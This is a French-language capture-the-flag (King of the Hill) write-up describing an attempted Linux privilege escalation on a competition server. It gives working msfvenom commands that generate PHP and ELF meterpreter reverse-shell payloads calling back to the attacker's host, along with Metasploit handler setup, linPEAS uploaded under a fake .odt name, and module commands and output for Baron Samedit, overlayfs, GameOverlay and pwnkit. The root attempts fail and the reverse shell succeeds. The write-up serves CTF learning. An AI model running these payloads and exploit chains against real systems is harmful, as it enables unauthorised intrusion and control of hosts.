# King of the Hill

Bon ben là on essaye d'aller jusqu'au bout : priv esc && root access !

tl;dr; ca n'a pas marché :( sont pas fun les organisateurs vraiment !

par ce que je suis derrière mon routeur wifi sans accès directe à internet depuis ma machine, voici les ressources que j'ai regardé pour pourvoir monter un vrai reverse-shell:

- https://www.offsec.com/metasploit-unleashed/
- https://docs.metasploit.com/docs/using-metasploit/other/how-to-use-metasploit-with-ngrok.html
- How to Metasploit Behind a NAT or: Pivoting and Reverse Tunneling with Meterpreter : https://medium.com/@nikosch86/how-to-metasploit-behind-a-nat-or-pivoting-and-reverse-tunneling-with-meterpreter-1e747e7fa901

C'est le dernier lien qui va m'aider : je m'ouvre trois ports 48444, 48445 et 48433 que j'ai "naté" vers 4444, 4445 et 4433 sur ma machine local, ces ports étant les privilégiés par metasploit lorsqu'il faut monter des handlers de connexion.

## reverse-shell / meterpreter

on va réexploiter la faille de [04-apache-80](../04-apache-80/) pour se monter le reverse shell.

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/php/meterpreter/reverse_tcp.md

```sh
# récupération de l'ip public
export LHOST=$(curl https://ipinfo.io/ip)
export LPORT=48444 # redir to my localip:4444
# génération du payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=48444 -f raw -o teamNoname.odt
```

```sh
# in msfconsole
# start a listener
use multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.122
set LPORT 4444
run
```

```sh
# dans un autre terminal (tmux powered!)
# executer le payload via le RCE de 04-apache-80
cp ../04-apache-80/Makefile .
cp ../04-apache-80/.htaccess .
cp ../04-apache-80/cv-rda.odt .
# adaptation pour accepter un parametre payload et
make exploit
make run PAYLOAD=teamNoname.odt
```

le meterpreter est up : utiliser `bg` ou `background` pour sortir du meterpreter mais garder la session ouverte.

```sh
# nettoyer le payload
pushd ../apache-80
make run CMD="rm teamNoname.odt"
make clean
popd
```

et on est dans la place proprement !

## tentative d'authn sur le user admin

dans la session meterpreter

```sh
shell -t
su - admin
# saisie du password trouvé en 02-smb-445
su: Authentication failure
```

KO

## linpeas

linPEAS est un énumérateur de système linux. Il va nous remonter plein d'infos sur le système et sa configuration, informations beaucoup plus approfondies que ce qu'on a gratté à la main dans [04-apache-80](../04-apache-80/).


### tentative par metasploit

je connaissais pas le plugin metasploit et par curiosité j'ai voulu essayer.

https://github.com/peass-ng/PEASS-ng/blob/master/metasploit/README.md

```sh
sudo wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/metasploit/peass.rb -O /opt/metasploit-framework/embedded/framework/modules/post/multi/gather/peass.rb
```

note: sur votre distrib les modules metasploit sont peut-être à tout autre endroit ;)

dans msfconsole
```sh
reload_all
use post/multi/gather/peass
sessions

run session=3 verbose=true
[+] PEASS script successfully retrieved.
[*] Encrypting PEASS and encoding it in Base64...
[*] Uploading obfuscated peass to /tmp/fr5bh...
[-] Post interrupted by the console user
[*] Post module execution completed
```

et un gros rien, pas d'affichage ??!

alternative:
```sh
run post/multi/recon/local_exploit_suggester
[*] 51.68.36.97 - Collecting local exploits for php/linux...
[-] 51.68.36.97 - No suggestions available.
```

merci beaucoup, il me cherche des failles php alors que je vais les failles du système arf.

### linpeas dans le reverse shell

Je bascule sur une exécution plus traditionnel de linPEAS.

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

download avec `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`

dans msfconsole
```sh
# récupérer la session
sessions # voir l'id de la session
sessions -i 3
upload linpeas.sh /tmp/cvrda.odt
shell -t
cd /tmp
chmod +x cvrda.odt
./cvrda.odt | tee cvrda.out
#récupérer le rapport après être sorti du shell
exit
download /tmp/cvrda.out
```

visualisez le rapport dans un autre terminal avec `less -R cvrda.out`

Notable:

```sh
[CVE-2021-3156] sudo Baron Samedit                                                                                                                  
                                                                            
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                  
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

You own the SUID file: /tmp/privesc.sh # privesc par une autre équipe ?
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

```

ca c'est du lourd : on "devrait" pouvoir passer root avec ca.

## baronsamedit

```sh
# démarrer un nouvel handler sur un autre port, le 4444 étant utilisé par notre shell actuel
set LPORT 4445
# metasploit garde en tête le dernier module utilisé, dans notre cas : multi/handler
run
```

```sh
use exploit/linux/local/sudo_baron_samedit
run session=4 verbose=true
[*] Started reverse TCP handler on 192.168.1.122:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: php
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Using 'python3' to run exploit
[*] Writing '/tmp/iXK8nqiJ6z.py' (763 bytes) ...
[*] Creating directory /tmp/libnss_LZzzE
[*] /tmp/libnss_LZzzE created
[*] Writing '/tmp/libnss_LZzzE/c .so.2' (540 bytes) ...
[*] Running python3 /tmp/iXK8nqiJ6z.py 56 54 63 212 LZzzE/c /tmp
[*] 
[*] Alternative exploit target(s) exist for this OS version:
[*] 2: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative
[*] Run `set target <id>` to select an alternative exploit script
[*] Exploit completed, but no session was created.
```

mouais, apparement "ca marche" mais on a pas de sessions. premier problème à adresser : la sessions reverse shell qu'on a est php et n'est pas compatible.

### pivoter vers un vrai meterpreter linux ?

```sh
# générer un nouveau payload
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=48445 -f elf -o lin.bin
```

on obtient un fichier exécutable qui va nous ouvrir une "vrai" session meterpreter.

```sh
# nouvel handler
use multi/handler
set PAYLOAD payload/linux/x64/meterpreter_reverse_tcp # il faut changer le type de payload
set LPORT 4445
run
```


uploader le payload sur la cible, puis background la session meterpreter, rerun le handler, run le payload via la faille de 04-apache-80.

Et là on optient un session x64/linux sur lequel on va pouvoir jouer le exploit_suggester.

```sh
use post/multi/recon/local_exploit_suggester
run session=4 # la session x64/linux

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/gameoverlay_privesc                             Yes                      The target is vulnerable. Focal Fossa with 5.4.0-208-generic kernel is vunerable
 4   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 5   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 6   exploit/linux/local/sudo_baron_samedit                              Yes                      The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
 7   exploit/linux/local/abrt_raceabrt_priv_esc                          No                       The target is not exploitable.
 8   exploit/linux/local/abrt_sosreport_priv_esc                         No                       The target is not exploitable.
...
```

on retrouve la faille baron samedi qu'on essaye de réexploiter via notre session linux mais rien de mieux : ca s'exécute mais pas de sessions.


## overlayfs

tentative d'exploit de overlayfs.

```sh
use exploit/linux/local/cve_2021_3493_overlayfs
set LHOST XX.XXX.XXX.XXX
set LPORT 48433
set ReverseListenerBindAddress 192.168.1.122
set ReverseListenerBindPort 4433
set SESSION 4
run
```

récupère un meterpreter mais en www-data : pas de privesc :(

### via local exploit in c

https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/

- upload exploit.c sur la machine via la session php
- compilation using gcc `exploit.c -o exploit`

mais y'a pas de gcc sur la machine distante !

https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/local/cve_2021_3493_overlayfs

upload depuis la library metasploit : /opt/metasploit-framework/embedded/framework/data/exploits/CVE-2021-3493/cve_2021_3493.x64.elf

KO pas de bash et encore moins de root.

## su_login

KO pas de sessions

## gameoverlay sur focal

```sh
use exploit/linux/local/gameoverlay_privesc
set LHOST XX.XXX.XXX.XXX
set LPORT 48433
set ReverseListenerBindAddress 192.168.1.122
set ReverseListenerBindPort 4433
set SESSION 3
check
run
```

no session :(

## pwnkit

```sh
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
# options
set LHOST XX.XXX.XXX.XXX
set LPORT 48445
# advanced
set ReverseListenerBindAddress 192.168.1.122
set ReverseListenerBindPort 4445
check
```

not vulnerable
